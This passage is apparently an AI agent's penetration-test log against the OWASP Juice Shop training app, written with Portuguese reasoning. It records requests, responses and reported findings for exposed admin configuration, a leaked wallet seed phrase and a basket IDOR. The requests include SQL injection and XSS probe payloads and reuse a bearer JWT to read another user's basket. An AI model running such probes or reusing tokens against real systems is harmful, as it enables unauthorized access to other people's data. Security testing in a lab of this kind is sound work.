+      "observation": "HTTP 200 GET http://juice-shop:3000/ftp/acquisitions.md\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"accept-ranges\":\"bytes\",\"cache-control\":\"public, max-age=0\",\"last-modified\":\"Tue, 14 Apr 2026 06:47:22 GMT\",\"etag\":\"W/\\\"38d-19d8abea090\\\"\",\"content-type\":\"text/markdown; charset=UTF-8\",\"content-length\":\"909\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:15",
+      "timestamp": "2026-08-03T15:15:51.044Z"
+    },
+    {
+      "iteration": 7,
+      "thought": "Confirmado! Arquivo confidencial \"Planned Acquisitions\" acessível publicamente. Information disclosure crítica. Agora vou continuar testando os outros arquivos .md e procurar por vulnerabilidades em endpoints de API.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/ftp/announcement_encrypted.md",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/ftp/announcement_encrypted.md\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"accept-ranges\":\"bytes\",\"cache-control\":\"public, max-age=0\",\"last-modified\":\"Tue, 14 Apr 2026 06:47:22 GMT\",\"etag\":\"W/\\\"5a255-19d8abea090\\\"\",\"content-type\":\"text/markdown; charset=UTF-8\",\"content-length\":\"369237\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03",
+      "timestamp": "2026-08-03T15:16:08.628Z"
+    },
+    {
+      "iteration": 8,
+      "thought": "Arquivo announcement_encrypted.md contém dados criptografados (grande número). Isso é información sensível exposta. Vou continuar coletando os arquivos .md restantes e depois focar em endpoints de API para SQL injection, XSS, IDOR, Mass Assignment e outras vulnerabilidades de maior impacto.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/ftp/legal.md",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/ftp/legal.md\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"accept-ranges\":\"bytes\",\"cache-control\":\"public, max-age=0\",\"last-modified\":\"Mon, 03 Aug 2026 15:12:17 GMT\",\"etag\":\"W/\\\"be7-19fc82ec9ec\\\"\",\"content-type\":\"text/markdown; charset=UTF-8\",\"content-length\":\"3047\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:16:26 GM",
+      "timestamp": "2026-08-03T15:16:26.120Z"
+    },
+    {
+      "iteration": 9,
+      "thought": "legal.md é apenas Lorem ipsum. Agora preciso focar em endpoints de API para encontrar vulnerabilidades reais. Vou testar systematicamente: SQL injection em search, XSS, IDOR em basket, Mass Assignment em endpoints POST/PUT, CORS misconfiguration, JWT attacks, e endpoints administrativos sem autenticação adequada.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/rest/admin/application-version",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/admin/application-version\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"20\",\"etag\":\"W/\\\"14-tCKnqyl1elU2Vzkywa8P9qRtJx4\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:16:43 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"version\"",
+      "timestamp": "2026-08-03T15:16:43.755Z"
+    },
+    {
+      "iteration": 10,
+      "thought": "Excelente! Versão exposta: 19.2.1. Isso é OWASP Juice Shop versão 19.2.1 — ferramenta de treinamento propositalmente vulnerável. Preciso verificar vulnerabilidades conhecidas desta versão específica e continuar enumerando endpoints. Vou testar /rest/admin/application-configuration que também expõe sem autenticação.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/rest/admin/application-configuration",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/admin/application-configuration\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"21770\",\"etag\":\"W/\\\"550a-OEo3agZPnY9Z7Todze3/X9Rt2J8\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:16:58 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n",
+      "timestamp": "2026-08-03T15:16:58.683Z"
+    },
+    {
+      "iteration": 11,
+      "thought": "Excelente! Configuração completa exposta sem autenticação. Observo informações sensíveis: domínio, baseUrl, features habilitadas, integração com redes sociais, e potencialmente mais dados sensíveis no resto truncado. Vou fazer report deste finding crítico de information disclosure e continuar enumerando endpoints.",
+      "action": {
+        "action": "report_finding",
+        "title": "Unauthenticated Access to Admin Configuration Endpoint",
+        "severity": "HIGH",
+        "category": "Sensitive Data Exposure",
+        "description": "The /rest/admin/application-configuration endpoint is publicly accessible without authentication and exposes complete application configuration including domain, baseUrl, server details, social media URLs, and internal settings. This violates the principle of least privilege and enables reconnaissance attacks. CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-548 (Exposure of Information Through Directory Listing). CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (Score: 7.5 - HIGH)",
+        "steps": [
+          "Send GET request to http://juice-shop:3000/rest/admin/application-configuration",
+          "No authentication required",
+          "Response contains complete configuration object with sensitive settings"
+        ],
+        "evidence": "HTTP 200 response body contains: {\"config\": {\"server\": {\"port\": 3000, \"basePath\": \"\", \"baseUrl\": \"http://localhost:3000\"}, \"application\": {...}, ...}}"
+      },
+      "observation": "Finding registrado com sucesso.\nTítulo: \"Unauthenticated Access to Admin Configuration Endpoint\" | Severidade: HIGH\nTotal de findings até agora: 1.",
+      "timestamp": "2026-08-03T15:17:15.882Z"
+    },
+    {
+      "iteration": 12,
+      "thought": "Bom, um finding foi registrado. Agora vou continuar testando sistematicamente. Preciso coletar as respostas dos testes em andamento — /api/Challenges/, /api/Feedbacks/, SQL injection, XSS, IDOR, e depois testar outras categorias como CSRF, CORS, JWT attacks, path traversal, deserialization, etc.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/api/Challenges/",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/api/Challenges/\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"59601\",\"etag\":\"W/\\\"e8d1-kaE43Naq/r0e62ZtTOeIPZKTKZA\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:17:32 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"status\": \"success\"",
+      "timestamp": "2026-08-03T15:17:32.036Z"
+    },
+    {
+      "iteration": 13,
+      "thought": "Excelente! /api/Challenges/ expõe uma lista completa de desafios do Juice Shop, incluindo descrições que revelam vulnerabilidades específicas a testar:\n1. \"Password Hash Leak\" — REST API endpoint expõe password hash do usuário logado\n2. \"API-only XSS\" — Stored XSS via API com <iframe src=\"javascript:alert(`xss`)\">\n\nIsso me dá um roadmap claro de vulnerabilidades a explorar. Vou focar em encontrar o endpoint que expõe password hash. Provavelmente é o /rest/user/whoami com campos sensíveis. Vou testar agora.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/rest/user/whoami",
+        "headers": {
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wOC0wMyAxNToxMjoxOC4yNTQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wOC0wMyAxNToxMjoxOC4yNTQgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzg1NzcwMDQzfQ.yUAQE_s4xeTtXDp62eT4wcVP-Hy8BdvewnGppqpl_Bd4BL0C8LH1kEt67lSHas56G83zAY3LZzxHZhZJslK4WU1FKcUfdOqe_t4uc5l-5BtEJLIuXe9ePabZ1E9aSh8MLo74aa5ehezz83Bhk0kHQYfThD2B8HXTn44eykt7QNg"
+        }
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/user/whoami\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"11\",\"etag\":\"W/\\\"b-/5bSboVjVhGw3qRgvUfZjE1r1Ns\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:17:48 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"user\": {}\n}",
+      "timestamp": "2026-08-03T15:17:48.895Z"
+    },
+    {
+      "iteration": 14,
+      "thought": "/rest/user/whoami sem autenticação retorna user vazio. Vou testar COM autenticação para ver se retorna dados completos incluindo password hash.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/rest/user/whoami",
+        "headers": {
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wOC0wMyAxNToxMjoxOC4yNTQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wOC0wMyAxNToxMjoxOC4yNTQgKzAwOjowIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzg1NzcwMDQzfQ.yUAQE_s4xeTtXDp62eT4wcVP-Hy8BdvewnGppqpl_Bd4BL0C8LH1kEt67lSHas56G83zAY3LZzxHZhZJslK4WU1FKcUfdOqe_t4uc5l-5BtEJLIuXe9ePabZ1E9aSh8MLo74aa5ehezz83Bhk0kHQYfThD2B8HXTn44eykt7QNg"
+        }
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/user/whoami\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"11\",\"etag\":\"W/\\\"b-/5bSboVjVhGw3qRgvUfZjE1r1Ns\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:18:00 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"user\": {}\n}",
+      "timestamp": "2026-08-03T15:18:00.864Z"
+    },
+    {
+      "iteration": 15,
+      "thought": "Interessante — mesmo COM autenticação (Authorization header), /rest/user/whoami retorna user vazio. Isso sugere que o endpoint não está validando o token corretamente, ou o token não está sendo passado no formato esperado. De acordo com o AppMap, /rest/user/whoami?fields=email estava retornando 200, o que sugere que talvez o endpoint espere parâmetros query específicos. Vou testar com fields na query string.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/rest/user/whoami?fields=email,id,role,isAdmin,password",
+        "headers": {
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wOC0wMyAxNToxMjoxOC4yNTQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wOC0wMyAxNToxMjoxOC4yNTQgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzg1NzcwMDQzfQ.yUAQE_s4xeTtXDp62eT4wcVP-Hy8BdvewnGppqpl_Bd4BL0C8LH1kEt67lSHas56G83zAY3LZzxHZhZJslK4WU1FKcUfdOqe_t4uc5l-5BtEJLIuXe9ePabZ1E9aSh8MLo74aa5ehezz83Bhk0kHQYfThD2B8HXTn44eykt7QNg"
+        }
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/user/whoami?fields=email,id,role,isAdmin,password\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"11\",\"etag\":\"W/\\\"b-/5bSboVjVhGw3qRgvUfZjE1r1Ns\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:18:17 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=",
+      "timestamp": "2026-08-03T15:18:17.483Z"
+    },
+    {
+      "iteration": 16,
+      "thought": "Endpoint retorna user vazio independente de autenticação ou fields. Vou testar navegação no browser para verificar se o JWT está sendo armazenado em localStorage/sessionStorage e se o endpoint funciona em contexto de SPA. Mas antes, vou continuar testando outros endpoints críticos. Testando /api/Feedbacks/.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/api/Feedbacks/",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/api/Feedbacks/\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"1734\",\"etag\":\"W/\\\"6c6-xDYLt2o4UhrispGrP7YEKny0dvE\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:18:31 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"status\": \"success\",\n ",
+      "timestamp": "2026-08-03T15:18:31.398Z"
+    },
+    {
+      "iteration": 17,
+      "thought": "Excelente! /api/Feedbacks/ expõe dados sensíveis:\n1. UserId associado a comentários — IDOR potencial\n2. Email parcialmente mascarado mas reconhecível (***in@juice-sh.op = admin@juice-sh.op)\n3. Feedback ID 4 contém SEED DE CARTEIRA ETHEREUM — \"purpose betray marriage blame crunch monitor spin slide donate sport lift clutch\" — informação extremamente sensível!\n4. Feedback menciona vulnerabilidade: \"only order confirmation PDFs can be attached\" — sugestão de upload vulnerável\n\nVou fazer report deste finding crítico e depois testar os outros endpoints.",
+      "action": {
+        "action": "report_finding",
+        "title": "Sensitive Information Disclosure via Feedbacks API - Ethereum Wallet Seed Exposed",
+        "severity": "CRITICAL",
+        "category": "Sensitive Data Exposure",
+        "description": "The /api/Feedbacks/ endpoint exposes all user feedback including UserId associations, partially masked emails, and critically, exposes an Ethereum wallet recovery seed phrase in feedback comment ID 4. The seed phrase 'purpose betray marriage blame crunch monitor spin slide donate sport lift clutch' allows complete compromise of the associated cryptocurrency wallet. Additionally, the endpoint exposes user identities via UserId and email patterns. CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-548 (Exposure of Information Through Directory Listing), CWE-532 (Insertion of Sensitive Information into Log File). CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (Score: 9.1 - CRITICAL)",
+        "steps": [
+          "Send GET request to http://juice-shop:3000/api/Feedbacks/",
+          "No authentication required",
+          "Response contains all feedbacks with UserId and sensitive email information",
+          "Feedback ID 4 contains Ethereum wallet seed phrase in plain text"
+        ],
+        "evidence": "HTTP 200 response body contains: {\"UserId\": 21, \"id\": 4, \"comment\": \"Please send me the juicy chatbot NFT in my wallet at /juicy-nft : \\\"purpose betray marriage blame crunch monitor spin slide donate sport lift clutch\\\" (***ereum@juice-sh.op)\"}"
+      },
+      "observation": "Finding registrado com sucesso.\nTítulo: \"Sensitive Information Disclosure via Feedbacks API - Ethereum Wallet Seed Exposed\" | Severidade: CRITICAL\nTotal de findings até agora: 2.",
+      "timestamp": "2026-08-03T15:18:53.484Z"
+    },
+    {
+      "iteration": 18,
+      "thought": "Excelente! Dois findings reportados (1 HIGH + 1 CRITICAL). Agora vou continuar testando os outros endpoints de forma sistemática. Preciso cobrir: SQL injection, XSS, IDOR, CSRF, JWT attacks, path traversal, e outros endpoints ainda não testados. Vou acelerar coletando respostas dos testes em andamento.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/rest/products/search?q='",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/products/search?q='\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"30\",\"etag\":\"W/\\\"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:19:08 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"status\": \"succ",
+      "timestamp": "2026-08-03T15:19:08.872Z"
+    },
+    {
+      "iteration": 19,
+      "thought": "SQL injection com aspa simples retorna status success com array vazio — não há erro evidente. Vou testar com outros payloads para confirmar SQLi ou descartar. Testando XSS refletido agora.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"30\",\"etag\":\"W/\\\"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:19:24 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"ti",
+      "timestamp": "2026-08-03T15:19:24.544Z"
+    },
+    {
+      "iteration": 20,
+      "thought": "XSS payload retorna array vazio — não está sendo refletido na resposta JSON. Endpoint pode estar sanitizando ou simplesmente retornando sem matches. Vou testar IDOR e outros endpoints. Continuando com requisições em paralelo.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/rest/basket/1",
+        "headers": {
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wOC0wMyAxNToxMjoxOC4yNTQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wOC0wMyAxNToxMjoxOC4yNTQgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzg1NzcwMDQzfQ.yUAQE_s4xeTtXDp62eT4wcVP-Hy8BdvewnGppqpl_Bd4BL0C8LH1kEt67lSHas56G83zAY3LZzxHZhZJslK4WU1FKcUfdOqe_t4uc5l-5BtEJLIuXe9ePabZ1E9aSh8MLo74aa5ehezz83Bhk0kHQYfThD2B8HXTn44eykt7QNg"
+        }
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/basket/1\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"1310\",\"etag\":\"W/\\\"51e-BSPe6GTixWWprWakpZsCYu+Ct44\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:19:40 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"status\": \"success\",\n  ",
+      "timestamp": "2026-08-03T15:19:40.511Z"
+    },
+    {
+      "iteration": 21,
+      "thought": "IDOR CONFIRMADO! Usuário autenticado como ID=2 conseguiu acessar /rest/basket/1 (que pertence ao UserId=1) e ver o carrinho completo de outro usuário, incluindo produtos, preços e quantidades. Isso é uma vulnerabilidade crítica de Broken Access Control (CWE-284).\n\nVou fazer report deste finding crítico.",
+      "action": {
+        "action": "report_finding",
+        "title": "Insecure Direct Object Reference (IDOR) - Unauthorized Access to Other Users' Baskets",
+        "severity": "HIGH",
+        "category": "Broken Access Control",
+        "description": "The /rest/basket/{id} endpoint does not properly validate that the authenticated user owns the basket they are accessing. An authenticated user (ID=2) can access the basket of another user (ID=1) by simply changing the ID parameter in the URL. This allows viewing other users' shopping baskets, products, quantities, prices (including deluxe pricing), and coupon information. This is a horizontal privilege escalation vulnerability enabling access to other users' private data. CWE-284 (Improper Access Control / IDOR), CWE-639 (Authorization Bypass). CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (Score: 6.5 - HIGH)",
+        "steps": [
+          "Authenticate as user jim@juice-sh.op (ID=2) and obtain JWT token",
+          "Send GET request to http://juice-shop:3000/rest/basket/1 with Authorization header",
+          "Endpoint returns complete basket data for user ID=1 without ownership validation",
+          "Attacker can enumerate all user baskets by incrementing the ID parameter"
+        ],
+        "evidence": "HTTP 200 GET /rest/basket/1 with Auth header of user ID=2 returns: {\"status\": \"success\", \"data\": {\"id\": 1, \"UserId\": 1, \"coupon\": null, \"Products\": [{\"id\": 1, \"name\": \"Apple Juice (1000ml)\", \"price\": 1.99, \"deluxePrice\": 0.99, \"BasketItem\": {\"quantity\": 2}}, ...]}}"
+      },
+      "observation": "Finding registrado com sucesso.\nTítulo: \"Insecure Direct Object Reference (IDOR) - Unauthorized Access to Other Users' Baskets\" | Severidade: HIGH\nTotal de findings até agora: 3.",
+      "timestamp": "2026-08-03T15:20:00.481Z"
+    },
+    {
+      "iteration": 22,
+      "thought": "Três findings reportados (1 HIGH sobre admin config + 1 CRITICAL sobre Ethereum seed + 1 HIGH sobre IDOR). Agora vou acelerar os testes. Preciso coletar respostas pendentes e testar Mass Assignment, CSRF, JWT attacks, path traversal, e mais endpoints. Vou fazer requisições para /api/Quantitys/, /api/SecurityQuestions/, /api/Hints/, etc.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/api/Quantitys/",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/api/Quantitys/\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"6258\",\"etag\":\"W/\\\"1872-taQP7kcJmMLABBlKvOvsqfuHhv4\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:20:13 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"status\": \"success\",\n",
+      "timestamp": "2026-08-03T15:20:13.272Z"
+    },
+    {
+      "iteration": 23,
+      "thought": "/api/Quantitys/ expõe dados de inventário e limites de compra por usuário sem autenticação. Isso permite aos atacantes saber quantidades disponíveis e limites — information disclosure mas não crítica. Continuando coleta de dados.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/api/SecurityQuestions/",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/api/SecurityQuestions/\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"1934\",\"etag\":\"W/\\\"78e-DJRqxYN5oB+OxjoDoG6l3lfn9Yo\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:20:30 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"status\": \"suc",
+      "timestamp": "2026-08-03T15:20:30.539Z"
+    },
+    {
+      "iteration": 24,
+      "thought": "/api/SecurityQuestions/ expõe lista de perguntas de segurança sem autenticação. Isso é information disclosure básica — permite atacante enumerar quais perguntas estão disponíveis para força bruta. Continuando com testes de endpoints restantes e então testando ataques específicos.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/api/Hints/",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/api/Hints/\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"93324\",\"etag\":\"W/\\\"16c8c-d3OVC0HaSODHHckPOw3BaUSw1Zc\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:20:47 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"status\": \"success\",\n  ",
+      "timestamp": "2026-08-03T15:20:47.899Z"
+    },
+    {
+      "iteration": 25,
+      "thought": "/api/Hints/ expõe hints de desafios sem autenticação — information disclosure que revela exatamente qual vulnerabilidade testar (\"An overly generic solution for data retrieval can backfire\" → hints para field selection/Mass Assignment). Vou continuar coleta de dados.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/rest/captcha/",
+        "headers": {}
+      },
